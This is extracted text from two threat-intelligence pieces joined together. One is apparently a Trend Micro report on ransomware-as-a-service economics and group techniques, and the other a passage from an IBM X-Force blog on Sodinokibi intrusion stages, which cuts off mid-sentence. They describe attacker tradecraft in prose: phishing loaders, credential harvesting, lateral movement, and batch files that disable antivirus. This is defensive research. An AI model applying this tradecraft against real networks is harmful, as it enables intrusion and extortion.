Simply put, RaaS involves selling or renting\nransomware to buyers who are called affiliates. \n\nIn the past, ransomware attacks were mainly launched by the ransomware operators\nthemselves. When RaaS entered the picture, however, it made it easier for a variety of\nattackers, even those who have little technical knowledge, to wield ransomware against\ntargets. \n\nEssentially, we observed an organized division of labor in groups using RaaS. As a result of\nthis development, the participants of the cybercrime ecosystem gain higher proficiency and\nspecialization with regard to specific tasks, with some focusing on penetrating networks and\nothers on running the ransomware or conducting ransom negotiation with victims.\n\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-as-a-service-enabler-of-widespread-attacks\nhttps://www.trendmicro.com/vinfo/us/security/definition/ransomware\n\n\n2/14\n\nSuch specialization, coupled with refined extortion techniques and technical strategies,\nmakes modern ransomware a notorious threat. With the threat’s ever-growing reach, it was\npredicted that ransomware attacks could cost billions in the next decade.\n\nHow RaaS operates: the underground as a breeding ground\n\nWhile RaaS is based on the software-as-a-service (SaaS) model where software can be\naccessed online on a subscription basis, it also continues to evolve in its own ways, and this\nfully functional and independent ecosystem thrives in the underground with its key players.\n\nAmong these key players are the operators, or those who develop and peddle ransomware.\nThey are usually organized in a group and have designated roles such as leader,\ndevelopers, and infrastructure and system administrators. More advanced groups might also\nhave other roles, such as recruiters, penetration testers (aka pentesters), victim analysts,\nand negotiators.\n\nSome roles and tools might also be outsourced or acquired through affiliate programs. For\ninstance, some operators avail of access-as-a-service (AaaS), which can provide various\nmeans of access to targeted organizations. Meanwhile, other groups could have strong\npenetration testing teams but might also lack the necessary ransomware software. Such\npenetration testing teams often participate as affiliates for RaaS and use affiliate program\nransomware tools and infrastructure when a target is compromised. Affiliates might belong to\norganized gangs themselves or might operate independently.\n\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021\nhttps://www.zdnet.com/article/the-cost-of-ransomware-around-the-globe-to-go-beyond-265-billion-in-the-next-decade/\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-as-a-service-what-this-means-for-enterprises\nhttps://www.investopedia.com/terms/s/software-as-a-service-saas.asp\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/commodified-cybercrime-infrastructure-exploring-the-underground-services-market-for-cybercriminals\nhttps://www.zdnet.com/article/ransomware-as-a-service-negotiators-between-hackers-and-victims-are-now-in-high-demand/\nhttps://www.atlanticcouncil.org/in-depth-research-reports/report/countering-cyber-proliferation-zeroing-in-on-access-as-a-service/\n\n\n3/14\n\nFigure 1. Comparison of direct ransomware operations (left) and RaaS operators (right)\n\nWith regard to the RaaS operation model, the RaaS-operating criminal group first needs to\ndevelop or acquire the ransomware software and infrastructure. They then proceed to recruit\naffiliates through online forums, Telegram channels, or personal connections, with some\noperators investing as much as US$1 million for recruitment efforts. Once enlisted, affiliates\ncan then launch their own attacks.\n\nRaaS provides a win-win situation and a high payout for both operators and affiliates while\nallowing higher specialization in dedicated tasks. Affiliates can earn payouts without having\nto develop the ransomware themselves, while operators can directly make a profit from their\naffiliates. The payouts are normally organized using a revenue model for RaaS\nsubscriptions. The possible revenue models besides subscription are one-time payments,\nprofit sharing, and affiliate marketing. With such business models, the ransomware operators\ncan fully focus on developing and improving their ransomware software and operations\nwithout needing to spend resources on other tasks, such as compromising targets or\ndistributing the ransomware themselves. Instead, these tasks are delegated to the RaaS\naffiliates.\n\nThe cost of operations and its impact on ransom demands\n\nhttps://www.forbes.com/sites/simonchandler/2020/10/06/revil-ransomware-gang-offers-1-million-as-part-of-recruitment-drive/?sh=64e7a3b7bab2\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/modern-ransomwares-double-extortion-tactics-and-how-to-protect-enterprises-against-them\nhttps://www.beforecrypt.com/en/what-is-ransomware-as-a-service-raas-and-how-does-it-work/\n\n\n4/14\n\nIt goes without saying that there are operational expenses for any ransomware group. As a\nransomware group needs to spend money on tools, skilled personnel and monthly\noperational costs, ransomware attacks can indeed be expensive. A group leader thus needs\nto figure out how to cover the recurring cost of operation. In particular, the rental of network\ninfrastructure has its own cost, and many of the group members receive monthly salaries\nthat need to be paid even if the ransomware attack victims do not pay the ransom. A\nsuccessful payout from an attack is therefore necessary to cover the recurring operational\ncost of keeping a ransomware group running.\n\nThe one-time purchases of tools naturally come with their own price tags. Ransomware\ngroups and network penetration teams often do not develop the exploitation tools themselves\nbut prefer to purchase tools for initial access into organizations from third-party software\nvendors and underground market software developers who offer varying prices, either for on-\nhand or customized tools.\n\nFor groups following RaaS models and services with double extortion techniques,\npercentage payouts for kit sellers and RaaS partnership programs have risen, with some\nallocating for a full set of operations personnel such as pentesters, victim analysts, and\nnegotiators, as advertised in ads in underground forums.\n\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/trading-in-the-dark\n\n\n5/14\n\nFigure 2. Job posts in underground forums for pentesters and programmers capable of\naccessing enterprise networks and performing privilege escalation\n\nRegardless of successful payouts, most of these personnel require payment for services,\nwhether such remuneration involves monthly salary or per-project\npayments.Estimating average monthly costs (such as salaries, servers, virtual private server\nrentals, service providers, tools, accesses, and infrastructure, among others), these groups\nmight spend at least US$100,000 upward to keep operations running. If these groups target\n10 companies at a time but only one victim can pay, that single organization carries the brunt\nof all the expenses that the groups make in addition to the profit they hope to have. \n\nHowever, many organizations still refuse to pay ransom demands, either because of their\ninternal policies, government regulations, or the assistance of authorities. Ransomware\ngroups do not look kindly on these refusals for payment, and they find ways to retaliate\nagainst these companies. For example, Mespinoza operators threaten companies who\nrefuse to pay, not just with the exposure of sensitive data but also with the threat of reporting\nthe victim’s illegal activities, such as tax fraud or evasion.\n\nAvoiding certain targets\n\nIn the underground, ransomware operators also gradually developed a strategy for\ndetermining which targets to avoid. For instance, while the US remains one of the top targets\nfor all kinds of malicious activities, some ransomware operators discuss avoiding the country.\nIn the wake of high-profile ransomware attacks, authorities have been paying heightened\nattention to the threat. As a result, no-pay policies, government assistance to victims for\nransom negotiation, and techniques to recover paid ransom could cause ransomware groups\nto have a harder time getting paid.\n\nhttps://www.zdnet.com/article/this-ransomware-gang-hunts-for-evidence-of-crime-to-pressure-victims-into-paying-a-ransom/\nhttps://www.trendmicro.com/en_us/research/21/h/biden-releases-memo-on-critical-cybersecurity-infrastructure-bill.html\nhttps://thehill.com/policy/cybersecurity/559947-fbi-asks-congress-for-40-million-to-help-combat-wave-of-ransomware?rl=1\nhttps://securityboulevard.com/2021/07/q2-ransom-payment-amounts-decline-as-ransomware-becomes-a-national-security-priority/\nhttps://www.justice.gov/opa/pr/us-government-launches-first-one-stop-ransomware-resource-stopransomwaregov\nhttps://www.businessinsider.com/fbi-used-hackers-bitcoin-password-to-recover-colonial-pipeline-ransom-2021-6\n\n\n6/14\n\nAnd while some groups have turned their attention to Asia, ransomware groups generally\navoid, for example, going after Taiwanese companies because of the strict anti-money\nlaundering policies that make it difficult to legally purchase cryptocurrency and keep\norganizations from paying the demanded ransom. \n\nOther factors that can keep threat actors from attacking a certain region are the operators’\npatriotism, countries’ poverty levels, or geopolitical situations that targets are in.  For such\nlocations that are struggling economically and politically, or for countries that operators feel a\nsense of loyalty to, threat groups opt to use other monetization activities, such as the sale or\nrental of compromised assets or the use of keyloggers for harvesting various credentials,\nwhich later on can be sold individually or through a “cloud of logs.”\n\nRecent updates on RaaS operations\n\nThis year, there were also momentary but noticeable changes in the underground. After\nDarkSide’s attack on Colonial Pipeline, all topics related to ransomware were banned on\nmany underground forums. Operators shifted to discreet advertising in underground forums\nfor system administrators, pentesters, and other seemingly legitimate jobs  without disclosing\nthe purpose behind these ads. When it is discovered that the individuals behind these post\nare actually hiring for the purpose of operating ransomware, their accounts are banned.\n\nRansomware operators have also become more selective of their targets. We observed\ndiscussions in public and private groups about being more careful when choosing potential\nvictims and specifically avoiding political and critical infrastructure as well as the healthcare\nsector as targets. \n\nProfit division has also changed. Profits used to be usually divided into 70% and 30% in\nfavor of the affiliate when ransom demands were between five to six figures. Now, groups\ncollecting up to seven figures allot a 20% “finder’s fee” for access, while lateral movement\nand penetration testing are now done within the salaried group. This was the observed\nbehavior for groups like Nefilim. Based on growing popularity in forum discussions, hiring\nmore pentesters to become part of the salaried group and the continued professionalization\nof AaaS might likely continue to keep more of the profit intact and inside the main group.\n\nThe latest attacks also provide insight into where this is all heading. Based on REvil (aka\nSodinokibi) and DarkSide’s previous attacks on Linux-based VMware ESXi servers and\nnetwork-attached storage (NAS), there is a likelihood that other RaaS groups will be\nexpanding their targets and attacks to non-Windows servers, targeting other operating\nsystems such as Linux CentOS, Linux RedHat, and other UNIX flavors, all of which are\nPortable Operating System Interface (POSIX) compliant.\n\nRansomware families used by RaaS operators and affiliates\n\nhttps://geminiadvisory.io/ransomware-unmasked-dispute-reveals-ransomware-ttps/\nhttps://therecord.media/i-scrounged-through-the-trash-heaps-now-im-a-millionaire-an-interview-with-revils-unknown/\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/cybercriminal-cloud-of-logs-the-emerging-underground-business-of-selling-access-to-stolen-data\nhttps://www.bleepingcomputer.com/news/security/revil-ransomwares-new-linux-encryptor-targets-esxi-virtual-machines/\nhttps://www.trendmicro.com/en_us/research/21/e/darkside-linux-vms-targeted.html\n\n\n7/14\n\nMost modern ransomware families have adopted the RaaS model. In our midyear\ncybersecurity report, we found the top 10 most detected ransomware families. Interestingly,\neight of these families have been used by RaaS operators and affiliates at some point. Some\nfamilies, such as Locky, Cerber, and GandCrab, have been used in previous instances of\nRaaS operations, although these variants have not been actively employed for attacks\nrecently. Nevertheless, they are still being detected in affected systems:\n\nFigure 3. First half of 2021 data for most detected ransomware families that have been\nRaaS-operated at some point \n\nBased on this list, here are some of the ransomware families used by RaaS operators and\naffiliates to launch critical attacks this year:\n\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/modern-ransomwares-double-extortion-tactics-and-how-to-protect-enterprises-against-them\nhttps://www.trendmicro.com/vinfo/us/security/research-and-analysis/threat-reports/roundup/attacks-from-all-angles-2021-midyear-security-roundup\nhttps://www.crowdstrike.com/cybersecurity-101/ransomware/ransomware-as-a-service-raas/\nhttps://www.varonis.com/blog/cerber-ransomware/\nhttps://www.varonis.com/blog/cerber-ransomware/\n\n\n8/14\n\nREvil\n\nBefore suddenly disappearing, REvil consistently made headlines this year due to its high-\nprofile attacks, including those launched on meat supplier JBS and IT company Kaseya. It’s\nalso the fourth overall most detected ransomware in our 2021 midyear data, with 2,119\ndetections. After disappearing for about two months, this group recently brought their\ninfrastructure back and demonstrated signs of renewed activities.\n\nThis year, REvil demanded huge ransoms: US$70 million for the Kaseya attack (said to be\nrecord-breaking) and US$22.5 million (with US$11 million paid) for the JBS attack.\n\nFigure 4. REvil affiliate recruitment in underground forums\n\nTechniques\n\nWhile most techniques used by ransomware gangs remain the same from our most recent\nupdate, they also employed some new techniques, such as the following:\n\nDownload and execution\nAn attachment (such as a PDF file) of a malicious spam email drops Qakbot into the\nsystem. The malware will then download additional components and the payload.\nCVE-2021-30116, a zero-day vulnerability affecting the Kaseya VSA servers, was used\nin the Kaseya supply-chain attack.\n\nDiscovery\n\nAdditional legitimate tools, namely AdFind, SharpSploit, BloodHound, and NBTScan,\nare also observed to be employed for network discovery.\n\nDarkSide\n\nhttps://www.trendmicro.com/en_us/research/21/a/sodinokibi-ransomware.html\nhttps://www.zdnet.com/article/fbi-attributes-jbs-ransomware-attack-to-revil/\nhttps://www.trendmicro.com/en_us/research/21/g/it-management-platform-kaseya-hit-with-sodinokibi-revil-ransomwa.html\nhttps://www.bleepingcomputer.com/news/security/revil-ransomware-is-back-in-full-attack-mode-and-leaking-data/\nhttps://www.bleepingcomputer.com/news/security/jbs-paid-11-million-to-revil-ransomware-225m-first-demanded/\nhttps://www.crn.com/news/security/revil-demands-record-70m-in-kaseya-ransomware-attack\nhttps://www.bleepingcomputer.com/news/security/jbs-paid-11-million-to-revil-ransomware-225m-first-demanded/\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021\nhttps://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/80/qakbot-a-prevalent-infostealing-malware\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30116\nhttps://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021\n\n\n9/14\n\nDarkSide has also been prominent in the news lately due to its attack on Colonial Pipeline.\nThe targeted company was coerced to pay US$5 million in ransom. DarkSide ranked\nseventh with 830 detections in our midyear data on most detected ransomware families.\n\nOperators have since claimed that they will shut down operations due to pressure from\nauthorities. However, as with the case of some ransomware families, they might just lie low\nfor a while before resurfacing, or come out with the threat’s successor.\n\nTechniques\n\nAs discussed in our earlier report, some of the notable techniques utilized by DarkSide are\nthe following:\n\nReconnaissance\n\nFor this phase, DarkSide abuses various tools, namely PowerShell, Metasploit\nFramework, Mimikatz, and BloodHound.\n\nLateral movement\n\nFor lateral movement, DarkSide aims to gain Domain Controller (DC) or Active\nDirectory access. This is used to harvest credentials, escalate privileges, and gather\nvaluable assets that will be exfiltrated.\nThe DC network is then used to deploy the ransomware to connected machines.\n\nNefilim\n\nNefilim is the ninth most detected ransomware for midyear 2021, with 692 detections.\nAttackers that wield the ransomware variant set their sights on companies with billion-dollar\nrevenues.\n\nLike most modern ransomware families, Nefilim also employs double extortion techniques.\nNefilim affiliates are said to be especially vicious when affected companies don’t succumb to\nransom demands, and they keep leaked data published for a long time.\n\nTechniques\n\nNefilim makes use of a variety of techniques such as the following:\n\nInitial access\n\nNefilim can gain initial access through exposed RDPs.\nIt can also use Citrix Application Delivery Controller vulnerability (aka CVE-2019-\n19781) to gain entry into a system.\n\nLateral movement and defense evasion\n\nhttps://www.trendmicro.com/en_us/research/21/e/what-we-know-about-darkside-ransomware-and-the-us-pipeline-attac.html\nhttps://www.crn.com/news/security/colonial-pipeline-paid-5m-to-darkside-hours-after-attack-report\nhttps://www.nytimes.com/2021/05/14/business/darkside-pipeline-hack.html\nhttps://www.trendmicro.com/en_us/research/21/e/what-we-know-about-darkside-ransomware-and-the-us-pipeline-attac.html\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021\nhttps://www.cybereason.com/blog/cybereason-vs-darkside-ransomware\nhttps://www.trendmicro.com/en_vn/research/21/f/nefilim-modern-ransomware-attack-story.html\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\nhttps://www.trendmicro.com/en_us/research/21/f/nefilim-modern-ransomware-attack-story.html\nhttps://www.trendmicro.com/en_us/research/21/b/nefilim-ransomware.html\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-19781\n\n\n10/14\n\nNefilim is capable of lateral movement via tools such as PsExec or Windows\nManagement Instrumentation (WMI).\nIt performs defense evasion through the use of third-party tools like PC Hunter,\nProcess Hacker, and Revo Uninstaller.\n\nLockBit\n\nLockBit resurfaced in the middle of the year with LockBit 2.0, targeting more companies as\nthey employ double extortion techniques. Based on our findings, Chile, Italy, Taiwan, and the\nUK are among the most affected countries. In a recent prominent attack, ransom demand\nwent up as high as US$50 million.\n\nLockBit 2.0 claims to have one of the fastest encryption techniques among other\nransomware. It also shows similarities with prominent ransomware families, Ryuk and\nEgregor.\n\nFigure 4. LockBit affiliate recruitment in underground forums\n\nTechniques\n\nSome of the updated ransomware’s techniques are the following:\n\nExfiltration\n\nOperators provide StealBit (detected by Trend Micro as\nTrojanSpy.Win32.STEALBIT.YXBHM), a tool that can automatically exfiltrate data, to\ntheir affiliates to help the latter harvest assets.\n\nDefense evasion\n\nTo terminate processes and services, the following batch files are used:\n\nhttps://www.trendmicro.com/en_us/research/21/h/lockbit-resurfaces-with-version-2-0-ransomware-detections-in-chi.html\nhttps://www.cyber.gov.au/acsc/view-all-content/alerts/lockbit-20-ransomware-incidents-australia\nhttps://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti\n\n\n11/14\n\ndelsvc.bat (detected by Trend Micro as Trojan.BAT.KILLPROC.D) makes crucial\nprocesses (such as MySQL and QuickBooks) and services (such as Microsoft\nExchange) unavailable.\nAV.bat (detected by Trend Micro as Trojan.BAT.KILLAV.WLDX) uninstalls the antivirus\nprogram ESET. \nLogDelete.bat (detected by Trend Micro as PUA.BAT.DHARMA.A) clears Windows\nevent logs.  Defoff.bat (detected by Trend Micro as Trojan.BAT.KILLAV.WLDX) disables\nWindows Defender features such as real-time monitoring.\n\nImpact\n\nDevices are automatically encrypted across Windows through the abuse of Active\nDirectory group policies.\n\nConti\n\nConti is probably one of the largest ransomware groups operating today. It is often said to be\nthe successor of the Ryuk ransomware, as the former shares some similarities with the latter.\nFor example, with regard to tactics, both Conti and Ryuk are distributed via  Emotet, Trickbot,\nand BazarLoader. In our midyear roundup report data, Conti was the tenth most detected\nransomware, as it amassed 610 detections.\n\nRecently, the FBI and Cybersecurity and Infrastructure Security Agency (CISA) released an\nalert notice with regard to a surge in Conti ransomware attacks. Conti penetration-testing\ndocuments, which provide detailed information on the operators’ preferred techniques, were\nalso leaked.\n\nTechniques\n\nSome notable techniques of the Conti ransomware are as follows:\n\nInitial access\n\nConti can use malspam to gain entry into the system.\nIt can also exploit known vulnerabilities for initial access.\n\nDiscovery, lateral movement, and persistence\n\nConti can use open-source and off-the-shelf commercial tools, such as\nPowerSploit, Metasploit, ADFind, and Cobalt Strike for discovery and lateral\nmovement. \nOther commercial tools, such as AnyDesk, can also be used by Conti to maintain\npersistence on compromised targets.\n\nExfiltration\n\nhttps://www.trendmicro.com/en_us/research/21/c/vision-one-tracking-conti-ransomware.html\nhttps://www.trendmicro.com/vinfo/us/security/research-and-analysis/threat-reports/roundup/attacks-from-all-angles-2021-midyear-security-roundup\nhttps://us-cert.cisa.gov/ncas/alerts/aa21-265a\nhttps://github.com/ForbiddenProgrammer/conti-pentester-guide-leak\nhttps://www.trendmicro.com/en_us/research/21/c/vision-one-tracking-conti-ransomware.html\nhttps://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/\nhttps://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba\n\n\n12/14\n\nMega cloud storage can be used for the information exfiltration phase.\n\nDefense evasion\n\nDefense evasion can be performed through the use of third-party tools like PC Hunter,\nProcess Hacker, and Revo Uninstaller.\nConti also disables some security tools found in compromised systems.\n\nHow to defend systems against ransomware\n\nFor enterprises to protect themselves from ransomware attacks, it would help to establish\nransomware defense plans. These can be based on security frameworks, such as those\nfrom the Center of Internet Security (CIS) and the National Institute of Standards and\nTechnology (NIST). These guidelines can help with prioritization and resource management\nfor prevention, defense, and recovery from ransomware.\n\nBeyond the technical means, it is important to understand that attackers will use any\nidentified weakness within a target organization (such as customer data, mishandled\npersonal identifiable information [PII], or accounting mistakes) as pressure points to leverage\nthe ransom negotiation value and make the victim pay. Enterprises should therefore take\nthese issues into account when evaluating their organizational readiness to protect\nthemselves from ransomware attacks.\n\nSome of the best practices from these frameworks are as follows:\n\nAudit events and take inventory.\n\nTake note of the following:\n\nAvailable assets and data\nAuthorized and unauthorized devices and software\nSecurity events and incidents\n\nConfigure and monitor.\n\nManage and keep track of the following:\n\nHardware and software configurations\nAdmin privileges and access\nActivity in network ports, protocols, and services\nNetwork infrastructure devices, such as firewalls and routers, and their security\nconfigurations\n\nPatch and update.\n\nRegularly perform the following for software and applications:\n\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/the-state-of-ransomware-2020-s-catch-22\nhttps://www.cisecurity.org/controls/\nhttps://www.nist.gov/cyberframework\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/return-to-sender-preventing-ransomware-while-working-from-home\n\n\n13/14\n\nVulnerability assessments\nPatching or virtual patching\nVersion update\n\nProtect systems and recover data.\n\nImplement the following:\n\nData protection, backup, and recovery measures\nMultifactor authentication (MFA)\n\nSecure and defend layers.\n\nEmploy the following:\n\nThe defense in depth (DiD) principle. This is done by creating multiple layers of\ndefense against potential threats. One example of this is by blocking unused services\nnot just on afirewall but alsoon actual servers.\nNetwork segmentation and the least-privilege principle. It is paramount to follow\nthese when granting permissions to system users, services, and roles.\nEmail static and dynamic analysis. Both of these work to examine and block\nmalicious emails.\nThe latest version of security solutions to all layers of the system. These layers\ninclude email, endpoint, web, and network.\nMonitoring for early signs of an attack. Identifying the questionable presence\nof various tools in the system can save organizations much time and effort in staving off\npossible attacks.\nAdvanced detection technologies. In particular, technologies powered with AI and\nmachine learning offer fortified protection.\n\nTrain and test.\n\nConduct the following regularly:\n\nSecurity skills assessment and training\nRed team exercises and penetration tests\n\nTrend Micro Vision One™  helps detect and block suspicious activity, even those that might\nseem insignificant when monitored from only a single layer, through multilayered protection\nand behavior detection. It helps spot and block ransomware wherever it might be on the\nsystem.\n\nTrend Micro Cloud One™ –  Workload Security ensures real-time protection from both\nknown and emerging threats that exploit vulnerabilities. This is made possible through virtual\npatching, machine learning techniques, and global threat intelligence.\n\nhttps://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021\nhttps://www.trendmicro.com/en_us/business/products/detection-response.html\nhttps://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html\n\n\n14/14\n\nTrend Micro™ Deep Discovery™ Email Inspector performs custom sandboxing and\nadvanced analysis techniques.

Combating these\ngroups effectively similarly requires a team approach — specialization, understanding tactics\nand techniques and how to counter them and cutting off activity at its source. Arguably, it has\nnever been more imperative that cybersecurity specialists work together to counter a specific\ncyber threat.\n\nIBM Security X-Force Threat Intelligence and Incident Response teams have found that\ncollaboration has a force-multiplying effect in countering ransomware attacks. Intelligence on\nransomware groups can help inform and prioritize defenses, and in the event of an attack,\naccelerate the incident response process by providing direction and augmenting investigative\nfindings. In addition, data collected during ransomware investigations enhances analysts’\nunderstanding of ransomware groups, how they operate and how potential victims can\ncounter their tactics.\n\nTo illustrate these points, this blog will examine a collection of Sodinokibi TTPs through\nvarious ransomware attacks in-depth and highlight the ways intelligence and incident\nresponse work together to inform defenses against ransomware operators. Together,\nintelligence and incident response teams can better contain attacks in their early stages\nbefore ransomware deployment, address full deployment attacks and quickly remediate the\nincident. By sharing this information, we anticipate organizations will be better able to\nprevent and defend against a variety of different ransomware attacks.\n\nWhy Examine Sodinokibi?\n\nX-Force incident response data underscores the significant threat from Sodinokibi (also\nknown as REvil) ransomware attacks over the past two years. In fact, Sodinokibi made up\n29% of all X-Force ransomware engagements in 2020 and jumped to 37% of ransomware\nengagements in the first half of 2021. Although Sodinokibi infrastructure was partially shut\ndown in early July 2021, and X-Force has not observed ransomware attacks from the cartel\nsince that time, the tactics, techniques and procedures (TTPs) this group uses are common\nacross several groups. We anticipate the operators behind Sodinokibi activity will resume\nwork on ransomware operations again in the future, probably under a different name.\n\nStage 1: Initial Access Through QakBot Infections\n\nIn more than one Sodinokibi attack, X-Force incident response has observed the threat\nactors gain initial access through a QakBot infection delivered via a phishing email\ncontaining a Microsoft Office attachment or URL. While QakBot started out over a decade\nago as one of the top banking Trojans to emerge from the Eastern European cyber crime\narena, nowadays it is used for its foothold in company networks. Several ransomware groups\n\nhttps://securityintelligence.com/category/x-force/threats/\nhttps://securityintelligence.com/author/camille-singleton/\nhttps://securityintelligence.com/author/andrew-gorecki/\nhttps://securityintelligence.com/author/john-dwyer/\nhttps://www.ibm.com/topics/ransomware\nhttps://www.ibm.com/security/xforce\nhttps://securityintelligence.com/posts/how-cybersecurity-threat-intelligence-can-spot-problems-before-they-start/\nhttps://securityintelligence.com/posts/the-day-megacortex-ransomware-mayhem-was-averted/\nhttps://www.ibm.com/topics/incident-response\nhttps://www.rsaconference.com/library/podcast/hunting-sodinokibi\nhttps://securityintelligence.com/posts/sodinokibi-revil-ransomware-disrupt-trade-secrets/\nhttps://securityintelligence.com/qakbot-banking-trojan-causes-massive-active-directory-lockouts/\n\n\n3/13\n\nuse QakBot as an initial access vector, including Prolock, Egregor and, of course, Sodinokibi.\nQakBot operators specialize in gaining initial access through phishing emails and then sell\nthis access to cyber crime counterparts including ransomware actors, who conduct\nreconnaissance, move laterally, steal data and deploy ransomware.\n\nX-Force has observed QakBot phishing emails utilizing information gathered\nfrom hijacked email threads with subject lines involving unpaid invoices to entice a recipient\nto click on a link or open an attachment.\n\nTo further establish a sense of legitimacy with the recipient, QakBot weaponized Microsoft\nOffice documents will present a ‘DocuSign’ image containing instructions to enable the\npayload to execute.\n\nFigure 1: Microsoft Excel document containing QakBot DocuSign lure\n\nIn the QakBot to Sodinokibi incidents X-Force has observed, a phishing email with a\ncompressed archive attachment containing a Microsoft Excel spreadsheet was sent to a\nrecipient in response to an existing e-mail thread. To evade detection, QakBot maldocs have\nnot utilized traditional malicious VBA macros to deliver the payload. Instead, QakBot\nmaldocs leverage Excel 4.0 macros, hidden spreadsheet formulas and BIFF data. Upon\n\nhttps://www.proofpoint.com/us/blog/email-and-cloud-threats/ransomware-rise-key-trends-and-tips-you-need-know\nhttps://www.recordedfuture.com/egregor-ransomware-attacks/\nhttps://unit42.paloaltonetworks.com/revil-threat-actors/\nhttps://research.checkpoint.com/2020/exploring-qbots-latest-attack-methods/\n\n\n4/13\n\nexecution, the QakBot maldoc will initiate a download of a dynamic link library (DLL), which\nis the QakBot loader fetched via a call to URLDownloadToFileA. The loader is loaded via the\nDllRegisterServer function within rundll32.exe.\n\nAfter passing some anti-analysis checks, the QakBot loader will execute the main QakBot\npayload and establish persistence through a scheduled task that loads QakBot via\nrundll32.exe or regsvr32.exe.\n\nFigure 2: QakBot loader downloader within a hidden Microsoft Excel sheet named “Bob”\n\nFigure 3: Hidden Microsoft Excel formulas referencing data in hidden “Bob” sheet\n\nInitial Access Through Valak Infections\n\nIn other incidents, X-Force has observed Sodinokibi operators gaining initial access through\na Valak malware infection. Valak itself was delivered via phishing emails with password\nprotected and compressed archives containing malicious Word documents that advise the\nrecipient to enable macros through a Microsoft Word version mismatch lure.\n\nhttps://www.darkreading.com/threat-intelligence/valak-malware-retasked-to-steal-data-from-us-german-firms\n\n\n5/13\n\nFigure 4: Valak maldoc lure\n\nUpon execution, the maldoc downloads a Valak loader DLL as a .tmp file which executes an\nembedded JavaScript payload via wscript.exe. Once Valak has been loaded onto the target\nsystem, the malware will check in with the command-and-control servers (C2), copy itself to\nthe registry, and create a scheduled task for persistence which leverages alternate data\nstreams (ADS) to evade detection.\n\nFigure 5: Valak loader macro\n\nFigure 6: Valak persistence\n\n\n\n6/13\n\nStage 2: Transfer to Ransomware Actors\n\nAfter gaining persistence on the victim’s system, the QakBot and Valak operators probably\nsold their access to an affiliate working directly with Sodinokibi ransomware. After\ntransferring access, the Sodinokibi actor begins some manual processes, usually\ndownloading additional tools such as Cobalt Strike to establish interactive access on the\ninfected host.\n\nCobalt Strike is a commercial offensive security toolset that many ransomware operators\nhave adopted as their primary post-exploitation tool. Some of those are the DarkSide\ngang, Egregor, Clop, Ryuk, DoppelPaymer, Sodinokibi and several others.\n\nIn some instances, Sodinokibi operators have downloaded the legitimate remote access tool\nNetSupport Manager as a second stage remote access tool. This tool is used to download\nand execute PowerShell payloads and establish additional C2 communication channels.\n\nFigure 7: Valak NetSupport Manager secondary payload\n\nStage 3: Recon and Credential Harvesting\n\nAfter downloading additional tools and establishing interactive access to a compromised\nsystem, the Sodinokibi actors frequently perform system and Active Directory\nreconnaissance using living-off-the-land tools, those tools that are inherent to the victim’s\noperating system or legitimate system administration tools such as AdFind and that rarely\nappear malicious to security controls.\n\nThrough various Sodinokibi attacks, X-Force has observed common reconnaissance\noperations including enumerating lists of domain workstations and servers, domain\nadministrators, domain controllers, local users and groups and running processes.\n\nhttps://www.cobaltstrike.com/\nhttps://securityintelligence.com/posts/darkside-oil-pipeline-ransomware-attack/\nhttps://securityintelligence.com/posts/egregor-ransomware-negotiations-uncovered/\nhttps://securityintelligence.com/articles/ryuk-ransomware-operators-shift-tactics/\nhttps://securityintelligence.com/posts/sodinokibi-revil-ransomware-disrupt-trade-secrets/\n\n\n7/13\n\nFigure 8: Active Directory recon using nltest and AdFind\n\nWith another commercial pentesting tool in play, X-Force has observed Sodinokibi operators\nrepeatedly harvesting credentials using Mimikatz to escalate privileges and move laterally\nwithin the compromised environment.\n\nSome Sodinokibi operators also commonly execute lateral movement operations through the\ncreation of a new service on the target host, which uses the service control manager (SCM)\nto execute a PowerShell payload.\n\nAlternatively, in some attacks, Sodinokibi operators have leveraged admin shares to stage a\nmalicious binary on a remote host and subsequently configure a new service to execute the\nbinary to move laterally.\n\nFigure 9: Sodinokibi lateral movement via new service\n\nLateral movement, reconnaissance and credential harvesting operations continue until the\nSodinokibi operators have obtained privileged access to the environment and to the\norganization’s data repositories for eventual data exfiltration.\n\nAn interesting observation that X-Force has made over the course of several Sodinokibi\ninvestigations is that the Sodinokibi operators have switched remote access channels from\npost-exploitation tools to leveraging tools such as plink.exe and ngrok.exe. They use these\n\nhttps://attack.mitre.org/software/S0002/\n\n\n8/13\n\ntools to tunnel RDP 